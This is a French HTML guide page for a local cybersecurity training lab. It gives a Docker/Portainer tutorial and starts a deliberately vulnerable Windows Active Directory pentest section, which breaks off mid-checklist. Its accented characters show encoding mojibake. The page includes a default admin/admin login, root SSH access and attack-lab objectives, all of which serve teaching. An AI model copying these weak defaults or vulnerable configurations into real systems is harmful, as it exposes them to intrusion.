<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üõ°Ô∏è CyberLab Genesis - Guide d'Exploration Avanc√©</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            color: #ffffff;
            min-height: 100vh;
        }

        .header {
            background: linear-gradient(135deg, rgba(0,255,136,0.1), rgba(0,100,255,0.1));
            padding: 20px;
            text-align: center;
            border-bottom: 2px solid rgba(0,255,136,0.2);
        }

        .header h1 {
            font-size: 2.5em;
            color: #00ff88;
            text-shadow: 0 0 20px rgba(0,255,136,0.5);
            margin-bottom: 10px;
        }

        .lab-stats {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-top: 15px;
        }

        .stat-item {
            background: rgba(255,255,255,0.1);
            padding: 10px 20px;
            border-radius: 15px;
            text-align: center;
        }

        .stat-number {
            font-size: 1.5em;
            font-weight: bold;
            color: #00ff88;
        }

        .stat-label {
            font-size: 0.9em;
            color: #cccccc;
        }

        .tabs-container {
            background: rgba(0,0,0,0.3);
            padding: 0;
            border-bottom: 1px solid #333;
        }

        .tabs {
            display: flex;
            overflow-x: auto;
            scrollbar-width: thin;
        }

        .tab {
            background: rgba(255,255,255,0.05);
            border: none;
            color: #cccccc;
            padding: 15px 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            white-space: nowrap;
            border-bottom: 3px solid transparent;
            font-size: 1em;
        }

        .tab:hover {
            background: rgba(255,255,255,0.1);
            color: #ffffff;
        }

        .tab.active {
            background: linear-gradient(135deg, rgba(0,255,136,0.2), rgba(0,100,255,0.1));
            color: #00ff88;
            border-bottom: 3px solid #00ff88;
        }

        .tab-content {
            display: none;
            padding: 0;
            min-height: 80vh;
        }

        .tab-content.active {
            display: block;
        }

        .service-overview {
            padding: 30px;
            max-width: 1200px;
            margin: 0 auto;
        }

        .services-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }

        .service-card {
            background: linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.03));
            border-radius: 15px;
            padding: 20px;
            border: 2px solid transparent;
            transition: all 0.3s ease;
        }

        .service-card:hover {
            border-color: #00ff88;
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0,255,136,0.2);
        }

        .service-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }

        .service-icon {
            font-size: 2em;
            margin-right: 15px;
        }

        .service-title {
            font-size: 1.2em;
            font-weight: bold;
            color: #00ff88;
        }

        .service-desc {
            color: #cccccc;
            margin-bottom: 15px;
            line-height: 1.5;
        }

        .service-status {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .status-badge {
            padding: 5px 12px;
            border-radius: 15px;
            font-size: 0.8em;
            font-weight: bold;
        }

        .status-ready {
            background: #00ff88;
            color: #1a1a2e;
        }

        .status-coming {
            background: #ffaa00;
            color: #1a1a2e;
        }

        /* Portainer Page Styles */
        .portainer-page {
            padding: 30px;
            max-width: 1400px;
            margin: 0 auto;
        }

        .page-header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, rgba(0,123,255,0.1), rgba(0,100,255,0.05));
            border-radius: 20px;
            border: 2px solid rgba(0,123,255,0.2);
        }

        .page-title {
            font-size: 2.5em;
            color: #007bff;
            margin-bottom: 10px;
        }

        .learning-path {
            display: grid;
            grid-template-columns: 1fr;
            gap: 30px;
        }

        .step-card {
            background: linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.03));
            border-radius: 20px;
            padding: 30px;
            border-left: 5px solid #007bff;
        }

        .step-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .step-number {
            background: linear-gradient(45deg, #007bff, #0056b3);
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 20px;
        }

        .step-title {
            font-size: 1.5em;
            color: #007bff;
            font-weight: bold;
        }

        .step-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-top: 20px;
        }

        .theory-section {
            background: rgba(0,123,255,0.1);
            padding: 25px;
            border-radius: 15px;
            border-left: 4px solid #007bff;
        }

        .practice-section {
            background: rgba(40,167,69,0.1);
            padding: 25px;
            border-radius: 15px;
            border-left: 4px solid #28a745;
        }

        .section-title {
            font-size: 1.2em;
            font-weight: bold;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }

        .theory .section-title {
            color: #66aaff;
        }

        .practice .section-title {
            color: #28a745;
        }

        .objectives-list {
            list-style: none;
            margin-bottom: 20px;
        }

        .objectives-list li {
            padding: 8px 0;
            color: #cccccc;
            display: flex;
            align-items: center;
        }

        .objectives-list li:before {
            content: "üéØ";
            margin-right: 10px;
            font-size: 1.1em;
        }

        .interactive-exercise {
            background: rgba(255,193,7,0.1);
            border: 2px solid #ffc107;
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
        }

        .exercise-title {
            color: #ffc107;
            font-size: 1.3em;
            font-weight: bold;
            margin-bottom: 15px;
        }

        .checklist {
            background: rgba(0,0,0,0.2);
            padding: 20px;
            border-radius: 10px;
            margin: 15px 0;
        }

        .checklist-item {
            display: flex;
            align-items: center;
            padding: 10px 0;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        .checklist-item:last-child {
            border-bottom: none;
        }

        .checkbox {
            width: 20px;
            height: 20px;
            border: 2px solid #666;
            border-radius: 4px;
            margin-right: 12px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .checkbox.checked {
            background: #00ff88;
            border-color: #00ff88;
        }

        .checkbox.checked::after {
            content: "‚úì";
            color: #1a1a2e;
            font-weight: bold;
        }

        .terminal-sim {
            background: #1e1e1e;
            border-radius: 10px;
            margin: 20px 0;
            border: 1px solid #333;
            font-family: 'Courier New', monospace;
            overflow: hidden;
        }

        .terminal-header {
            background: #2d2d2d;
            padding: 10px 15px;
            display: flex;
            align-items: center;
            font-size: 0.9em;
        }

        .terminal-dots {
            display: flex;
            gap: 6px;
            margin-right: 15px;
        }

        .dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }

        .dot.red { background: #ff5f56; }
        .dot.yellow { background: #ffbd2e; }
        .dot.green { background: #27ca3f; }

        .terminal-body {
            padding: 20px;
            line-height: 1.6;
        }

        .command {
            color: #00ff88;
            margin-bottom: 8px;
        }

        .output {
            color: #cccccc;
            margin-bottom: 15px;
            white-space: pre-wrap;
        }

        .btn {
            padding: 12px 25px;
            border: none;
            border-radius: 25px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s ease;
            font-weight: bold;
            margin: 8px 5px;
        }

        .btn-primary {
            background: linear-gradient(45deg, #007bff, #0056b3);
            color: white;
        }

        .btn-primary:hover {
            background: linear-gradient(45deg, #0056b3, #004085);
            transform: translateY(-2px);
        }

        .btn-success {
            background: linear-gradient(45deg, #28a745, #1e7e34);
            color: white;
        }

        .btn-warning {
            background: linear-gradient(45deg, #ffc107, #d39e00);
            color: #1a1a2e;
        }

        .tips-box {
            background: linear-gradient(135deg, rgba(23,162,184,0.1), rgba(23,162,184,0.05));
            border-left: 4px solid #17a2b8;
            padding: 20px;
            border-radius: 0 15px 15px 0;
            margin: 25px 0;
        }

        .tips-box h4 {
            color: #17a2b8;
            margin-bottom: 12px;
            font-size: 1.2em;
        }

        .docker-concept {
            background: linear-gradient(135deg, rgba(0,123,255,0.08), rgba(0,123,255,0.03));
            border: 1px solid #007bff;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }

        .docker-concept h4 {
            color: #007bff;
            margin-bottom: 10px;
        }

        @media (max-width: 768px) {
            .step-content {
                grid-template-columns: 1fr;
            }
            
            .lab-stats {
                flex-direction: column;
                gap: 10px;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <h1>üõ°Ô∏è CyberLab Genesis</h1>
        <p>Guide d'Exploration Avanc√© - D√©couverte Progressive des Services</p>
        
        <div class="lab-stats">
            <div class="stat-item">
                <div class="stat-number">12</div>
                <div class="stat-label">Services Total</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">11</div>
                <div class="stat-label">Op√©rationnels</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">92%</div>
                <div class="stat-label">Taux de R√©ussite</div>
            </div>
        </div>
    </div>

    <!-- Navigation Tabs -->
    <div class="tabs-container">
        <div class="tabs">
            <button class="tab active" onclick="showTab('overview')">üè† Vue d'ensemble</button>
            <button class="tab" onclick="window.open('portainer_exploration.html', '_blank')">üê≥ Portainer</button>
	    <button class="tab" onclick="window.open('kali_exploration.html', '_blank')">üêß Kali Linux</button>            
	    <button class="tab" onclick="showTab('wazuh')">üõ°Ô∏è Wazuh SIEM</button>
            <button class="tab" onclick="showTab('dvwa')">üéØ DVWA</button>
            <button class="tab" onclick="showTab('webgoat')">üêê WebGoat</button>
            <button class="tab" onclick="showTab('juiceshop')">üßÉ Juice Shop</button>
            <button class="tab" onclick="showTab('kibana')">üìä Kibana</button>
            <button class="tab" onclick="showTab('grafana')">üìà Grafana</button>
            <button class="tab" onclick="showTab('phpmyadmin')">üóÑÔ∏è phpMyAdmin</button>
            <button class="tab" onclick="showTab('winlab')">üñ•Ô∏è Windows AD Lab</button>
        </div>
    </div>

    <!-- Tab Contents -->
    
    <!-- Overview Tab -->
    <div class="tab-content active" id="overview">
        <div class="service-overview">
            <h2>üè† Vue d'ensemble du Laboratoire</h2>
            <p>CyberLab Genesis comprend 12 services int√©gr√©s pour une formation compl√®te en cybers√©curit√©.</p>
            
            <div class="services-grid">
                <!-- Portainer -->
                <div class="service-card" onclick="window.open('portainer_exploration.html', '_blank')">
                    <div class="service-header">
                        <div class="service-icon">üê≥</div>
                        <div class="service-title">Portainer</div>
                    </div>
                    <div class="service-desc">Interface graphique pour la gestion Docker. Comprenez l'architecture du lab et administrez les conteneurs.</div>
                    <div class="service-status">
                        <div class="status-badge status-ready">PR√äT</div>
                        <a href="http://127.0.0.1:9000" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- Kali Linux -->
                <div class="service-card" onclick="window.open('kali_exploration.html', '_blank')">
                    <div class="service-header">
                        <div class="service-icon">üêß</div>
                        <div class="service-title">Kali Linux</div>
                    </div>
                    <div class="service-desc">Distribution Linux sp√©cialis√©e en tests de p√©n√©tration. Plateforme compl√®te avec plus de 600 outils de s√©curit√© pr√©install√©s.</div>
                    <div class="service-status">
                        <div class="status-badge status-ready">PR√äT</div>
                        <a href="ssh://root@127.0.0.1:2222" target="_blank" class="btn btn-primary">SSH</a>
                    </div>
                </div>

                <!-- Wazuh -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üõ°Ô∏è</div>
                        <div class="service-title">Wazuh SIEM</div>
                    </div>
                    <div class="service-desc">Syst√®me de d√©tection d'intrusions et monitoring s√©curit√©. Analysez les logs et d√©tectez les menaces.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="https://127.0.0.1:5443" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- DVWA -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üéØ</div>
                        <div class="service-title">DVWA</div>
                    </div>
                    <div class="service-desc">Damn Vulnerable Web Application. Application web intentionnellement vuln√©rable pour l'apprentissage.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="http://127.0.0.1:8081" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- WebGoat -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üêê</div>
                        <div class="service-title">WebGoat</div>
                    </div>
                    <div class="service-desc">Plateforme d'apprentissage OWASP interactive. Le√ßons pratiques sur les vuln√©rabilit√©s web.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="http://127.0.0.1:8082/WebGoat" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- Juice Shop -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üßÉ</div>
                        <div class="service-title">Juice Shop</div>
                    </div>
                    <div class="service-desc">Application e-commerce moderne avec vuln√©rabilit√©s r√©alistes. Challenges progressifs.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="http://127.0.0.1:8083" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- Kibana -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üìä</div>
                        <div class="service-title">Kibana</div>
                    </div>
                    <div class="service-desc">Visualisation et analyse des logs Elasticsearch. Dashboards et recherches avanc√©es.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="http://127.0.0.1:5601" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- Grafana -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üìà</div>
                        <div class="service-title">Grafana</div>
                    </div>
                    <div class="service-desc">Dashboards de monitoring et m√©triques. Surveillance en temps r√©el des services.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="http://127.0.0.1:3000" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- phpMyAdmin -->
                <div class="service-card">
                    <div class="service-header">
                        <div class="service-icon">üóÑÔ∏è</div>
                        <div class="service-title">phpMyAdmin</div>
                    </div>
                    <div class="service-desc">Administration MySQL via interface web. Gestion des bases de donn√©es du laboratoire.</div>
                    <div class="service-status">
                        <div class="status-badge status-coming">BIENT√îT</div>
                        <a href="http://127.0.0.1:8090" target="_blank" class="btn btn-primary">Ouvrir</a>
                    </div>
                </div>

                <!-- Windows AD Lab -->
                <div class="service-card" onclick="showTab('winlab')">
                    <div class="service-header">
                        <div class="service-icon">üñ•Ô∏è</div>
                        <div class="service-title">Windows AD Lab</div>
                    </div>
                    <div class="service-desc">Environnement Active Directory vuln√©rable. Domaine Windows avec DC, clients et failles configur√©es pour pentest avanc√©.</div>
                    <div class="service-status">
                        <div class="status-badge status-ready">PR√äT</div>
                        <button class="btn btn-primary" onclick="event.stopPropagation(); showTab('winlab')">Explorer</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Portainer Tab -->
    <div class="tab-content" id="portainer">
        <div class="portainer-page">
            <div class="page-header">
                <div class="page-title">üê≥ Portainer - Ma√Ætrise Docker</div>
                <p>Interface graphique pour comprendre et administrer l'infrastructure de conteneurs</p>
            </div>

            <div class="learning-path">
                
                <!-- √âtape 1: Premi√®re Connexion -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">1</div>
                        <div class="step-title">Premi√®re Connexion & Interface</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö Th√©orie Docker</div>
                            
                            <div class="docker-concept">
                                <h4>üê≥ Qu'est-ce que Docker ?</h4>
                                <p>Docker est une plateforme de conteneurisation qui permet d'empaqueter applications et d√©pendances dans des conteneurs l√©gers et portables.</p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üõ†Ô∏è Pourquoi Portainer ?</h4>
                                <p>Portainer transforme les commandes Docker complexes en interface graphique intuitive, essentielle pour administrer un laboratoire multi-services.</p>
                            </div>
                            
                            <ul class="objectives-list">
                                <li>Comprendre les concepts de conteneurisation</li>
                                <li>Ma√Ætriser l'interface Portainer</li>
                                <li>Identifier l'architecture CyberLab</li>
                            </ul>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">üõ†Ô∏è Premi√®re Connexion</div>
                            
                            <div class="terminal-sim">
                                <div class="terminal-header">
                                    <div class="terminal-dots">
                                        <div class="dot red"></div>
                                        <div class="dot yellow"></div>
                                        <div class="dot green"></div>
                                    </div>
                                    Test de connectivit√© Portainer
                                </div>
                                <div class="terminal-body">
                                    <div class="command">$ curl -I http://127.0.0.1:9000</div>
                                    <div class="output">HTTP/1.1 200 OK
Content-Type: text/html
‚úÖ Portainer accessible</div>
                                </div>
                            </div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 1: Premier Acc√®s</div>
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Ouvrir Portainer : http://127.0.0.1:9000</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Cr√©er compte admin (admin/admin lors de la 1√®re connexion)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>S√©lectionner "Get Started" ‚Üí Docker Local</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Noter le nombre de conteneurs actifs (doit √™tre ~12)</span>
                                    </div>
                                </div>
                                <div>
                                    <a href="http://127.0.0.1:9000" target="_blank" class="btn btn-primary">üöÄ Ouvrir Portainer</a>
                                    <button class="btn btn-success" onclick="validateStep1()">‚úÖ Valider l'√©tape</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- √âtape 2: Exploration des Conteneurs -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">2</div>
                        <div class="step-title">Exploration des Conteneurs CyberLab</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö Concepts Conteneurs</div>
                            
                            <div class="docker-concept">
                                <h4>üì¶ Container vs Image</h4>
                                <p><strong>Image</strong> = Template statique (nginx, mysql)<br>
                                <strong>Container</strong> = Instance en cours d'ex√©cution</p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üîç √âtats des Conteneurs</h4>
                                <p>
                                ‚Ä¢ <strong>Running</strong> : Fonctionnel ‚úÖ<br>
                                ‚Ä¢ <strong>Exited</strong> : Arr√™t√© ‚ùå<br>
                                ‚Ä¢ <strong>Restarting</strong> : Red√©marrage üîÑ
                                </p>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">üîç Mission d'Exploration</div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 2: Inventaire des Services</div>
                                <p>Dans Portainer ‚Üí <strong>Containers</strong>, identifiez tous les services CyberLab :</p>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üè† cyberlab_dashboard (port 8080)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üê≥ cyberlab_portainer (port 9000)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üóÑÔ∏è cyberlab_phpmyadmin (port 8090)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üéØ cyberlab_dvwa (port 8081)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üêê cyberlab_webgoat (ports 8082, 9090)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üßÉ cyberlab_juice_shop (port 8083)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üìä cyberlab_kibana (port 5601)</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>üõ°Ô∏è cyberlab_wazuh_dashboard (port 5443)</span>
                                    </div>
                                </div>
                                
                                <div class="tips-box">
                                    <h4>üí° Astuce d'Investigation</h4>
                                    <p>Cliquez sur chaque conteneur pour voir ses d√©tails : ports mapp√©s, variables d'environnement, volumes mont√©s, logs en temps r√©el.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- √âtape 3: Analyse du R√©seau -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">3</div>
                        <div class="step-title">Architecture R√©seau & S√©curit√©</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö R√©seaux Docker</div>
                            
                            <div class="docker-concept">
                                <h4>üåê Types de R√©seaux</h4>
                                <p>
                                ‚Ä¢ <strong>Bridge</strong> : R√©seau priv√© isol√©<br>
                                ‚Ä¢ <strong>Host</strong> : Utilise l'interface h√¥te<br>
                                ‚Ä¢ <strong>Custom</strong> : R√©seau personnalis√©
                                </p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üîí S√©curit√© R√©seau</h4>
                                <p>Les conteneurs CyberLab utilisent un r√©seau custom <strong>v100_cyberlab_network</strong> avec plan d'adressage 172.35.0.0/24</p>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">üåê Analyse du R√©seau</div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 3: Cartographie R√©seau</div>
                                <p>Dans Portainer ‚Üí <strong>Networks</strong> ‚Üí <strong>v100_cyberlab_network</strong> :</p>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Identifier le subnet : 172.35.0.0/24</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Dashboard IP : 172.35.0.20</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Portainer IP : 172.35.0.2</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Compter combien de conteneurs sont connect√©s</span>
                                    </div>
                                </div>
                                
                                <div class="terminal-sim">
                                    <div class="terminal-header">
                                        <div class="terminal-dots">
                                            <div class="dot red"></div>
                                            <div class="dot yellow"></div>
                                            <div class="dot green"></div>
                                        </div>
                                        V√©rification r√©seau depuis l'h√¥te
                                    </div>
                                    <div class="terminal-body">
                                        <div class="command">$ docker network ls | grep cyberlab</div>
                                        <div class="output">v100_cyberlab_network   bridge   local</div>
                                        <div class="command">$ docker network inspect v100_cyberlab_network</div>
                                        <div class="output">[D√©tails du r√©seau avec IPs de tous les conteneurs]</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- √âtape 4: Monitoring et Logs -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">4</div>
                        <div class="step-title">Monitoring & Analyse des Logs</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö Monitoring Docker</div>
                            
                            <div class="docker-concept">
                                <h4>üìä M√©triques Importantes</h4>
                                <p>
                                ‚Ä¢ <strong>CPU</strong> : Utilisation processeur<br>
                                ‚Ä¢ <strong>Memory</strong> : RAM consomm√©e<br>
                                ‚Ä¢ <strong>Network I/O</strong> : Trafic r√©seau<br>
                                ‚Ä¢ <strong>Block I/O</strong> : Lecture/√©criture disque
                                </p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üìã Logs Docker</h4>
                                <p>Chaque conteneur g√©n√®re des logs accessibles via <code>docker logs</code> ou l'interface Portainer.</p>
                            </div>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">üîç Monitoring Pratique</div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 4: Surveillance Active</div>
                                
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Aller dans Containers ‚Üí cliquer sur cyberlab_dashboard</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Onglet "Stats" ‚Üí Observer CPU/Memory en temps r√©el</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Onglet "Logs" ‚Üí Voir les acc√®s nginx en direct</span>
                                    </div>
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>Tester avec un autre conteneur (webgoat par exemple)</span>
                                    </div>
                                </div>
                                
                                <div class="tips-box">
                                    <h4>üîß Challenge Bonus</h4>
                                    <p>Red√©marrez un conteneur via Portainer et observez les logs de d√©marrage. Puis v√©rifiez que le service redevient accessible.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <!-- Autres onglets (structure vide pour l'instant) -->
    <div class="tab-content" id="wazuh">
        <div class="service-overview">
            <h2>üõ°Ô∏è Wazuh SIEM</h2>
            <p>Guide de d√©couverte Wazuh - <em>En cours de d√©veloppement...</em></p>
        </div>
    </div>

    <div class="tab-content" id="dvwa">
        <div class="service-overview">
            <h2>üéØ DVWA</h2>
            <p>Guide de d√©couverte DVWA - <em>En cours de d√©veloppement...</em></p>
        </div>
    </div>

    <div class="tab-content" id="webgoat">
        <div class="service-overview">
            <h2>üêê WebGoat</h2>
            <p>Guide de d√©couverte WebGoat - <em>En cours de d√©veloppement...</em></p>
        </div>
    </div>

    <div class="tab-content" id="juiceshop">
        <div class="service-overview">
            <h2>üßÉ Juice Shop</h2>
            <p>Guide de d√©couverte Juice Shop - <em>En cours de d√©veloppement...</em></p>
        </div>
    </div>

    <div class="tab-content" id="kibana">
        <div class="service-overview">
            <h2>üìä Kibana</h2>
            <p>Guide de d√©couverte Kibana - <em>En cours de d√©veloppement...</em></p>
        </div>
    </div>

    <div class="tab-content" id="grafana">
        <div class="service-overview">
            <h2>üìà Grafana</h2>
            <p>Guide de d√©couverte Grafana - <em>En cours de d√©veloppement...</em></p>
        </div>
    </div>

    <div class="tab-content" id="phpmyadmin">
        <div class="service-overview">
            <h2>üóÑÔ∏è phpMyAdmin</h2>
            <p>Guide de d√©couverte phpMyAdmin - <em>En cours de d√©veloppement...</em></p>
        </div>
    </div>

    <!-- Windows AD Lab Tab -->
    <div class="tab-content" id="winlab">
        <div class="portainer-page">
            <div class="page-header">
                <div class="page-title">üñ•Ô∏è Windows Active Directory Lab</div>
                <p>Environnement de domaine Windows vuln√©rable pour pentest avanc√©</p>
                <div class="lab-stats" style="margin-top: 15px;">
                    <div class="stat-item">
                        <div class="stat-number">1</div>
                        <div class="stat-label">Domain Controller</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">3</div>
                        <div class="stat-label">Clients Windows</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number">15+</div>
                        <div class="stat-label">Vuln√©rabilit√©s</div>
                    </div>
                </div>
            </div>

            <div class="learning-path">
                
                <!-- √âtape 1: Architecture & D√©ploiement -->
                <div class="step-card">
                    <div class="step-header">
                        <div class="step-number">1</div>
                        <div class="step-title">Architecture & D√©ploiement du Domaine</div>
                    </div>
                    
                    <div class="step-content">
                        <div class="theory-section theory">
                            <div class="section-title">üìö Architecture Active Directory</div>
                            
                            <div class="docker-concept">
                                <h4>üè¢ Structure du Lab CYBERLAB.LOCAL</h4>
                                <p><strong>Domaine :</strong> CYBERLAB.LOCAL<br>
                                <strong>DC :</strong> WIN-DC01 (172.35.0.10)<br>
                                <strong>Clients :</strong> WIN-CLI01/02/03 (172.35.0.11-13)<br>
                                <strong>Kali Attaquant :</strong> cyberlab_kali_attacker (172.35.0.100)</p>
                            </div>
                            
                            <div class="docker-concept">
                                <h4>üéØ Objectifs d'Apprentissage</h4>
                                <p>
                                ‚Ä¢ Comprendre les services AD (DNS, Kerberos, LDAP)<br>
                                ‚Ä¢ Ma√Ætriser les attaques post-exploitation<br>
                                ‚Ä¢ Utiliser BloodHound pour la cartographie<br>
                                ‚Ä¢ Exploiter les vuln√©rabilit√©s Windows communes
                                </p>
                            </div>
                            
                            <ul class="objectives-list">
                                <li>D√©ployer l'environnement Windows</li>
                                <li>Configurer le domaine Active Directory</li>
                                <li>Cr√©er les comptes utilisateurs vuln√©rables</li>
                                <li>Installer les outils d'attaque sur Kali</li>
                            </ul>
                        </div>

                        <div class="practice-section practice">
                            <div class="section-title">üõ†Ô∏è D√©ploiement du Lab Windows</div>
                            
                            <div class="terminal-sim">
                                <div class="terminal-header">
                                    <div class="terminal-dots">
                                        <div class="dot red"></div>
                                        <div class="dot yellow"></div>
                                        <div class="dot green"></div>
                                    </div>
                                    D√©ploiement Windows AD Lab
                                </div>
                                <div class="terminal-body">
                                    <div class="command">$ cd ~/cyberlab/versions/v1.0.0</div>
                                    <div class="command">$ docker-compose up -d win-dc01 win-cli01 win-cli02</div>
                                    <div class="output">Creating cyberlab_win_dc01 ... done
Creating cyberlab_win_cli01 ... done
Creating cyberlab_win_cli02 ... done</div>
                                    <div class="command">$ docker ps | grep win</div>
                                    <div class="output">cyberlab_win_dc01    Up 2 minutes   0.0.0.0:3389->3389/tcp
cyberlab_win_cli01   Up 2 minutes   0.0.0.0:3390->3389/tcp</div>
                                </div>
                            </div>
                            
                            <div class="interactive-exercise">
                                <div class="exercise-title">üéØ Exercise 1: D√©ploiement Initial</div>
                                <div class="checklist">
                                    <div class="checklist-item">
                                        <div class="checkbox" onclick="toggleCheck(this)"></div>
                                        <span>D√©marrer les conteneurs Windows (DC + Clients)</span>
                                    </div>
                                    <div class="checklist-item">
